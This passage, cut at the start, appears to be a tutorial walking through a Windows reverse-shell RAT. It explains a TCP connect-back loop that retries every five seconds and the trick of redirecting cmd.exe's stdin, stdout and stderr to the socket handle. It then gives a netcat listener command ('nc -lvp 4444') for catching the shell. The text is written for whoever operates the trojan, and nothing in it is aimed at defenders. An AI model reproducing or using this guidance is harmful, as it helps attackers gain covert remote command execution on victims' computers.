SOCK_STREAM
for TCP (because we want reliability, not dropped packets).
The Connection Loop:
This is crucial. If the target machine boots up before you have your listener ready, a bad RAT just dies. This one waits. It sleeps for 5 seconds and tries again. It misses you, so it keeps calling until you pick up.
CreateProcess
Magic:
This is the best part. Instead of manually handling
recv()
and
send()
for every command, we map the process's
stdin
,
stdout
, and
stderr
directly to the socket handle (
(HANDLE)sock
). This means when you type on your end, it feeds directly into
cmd.exe
on the target, and the output flows directly back to you. It's seamless.
To use this, you'd just set up a listener on your machine (the IP defined in the code) like:
nc -lvp 4444
.
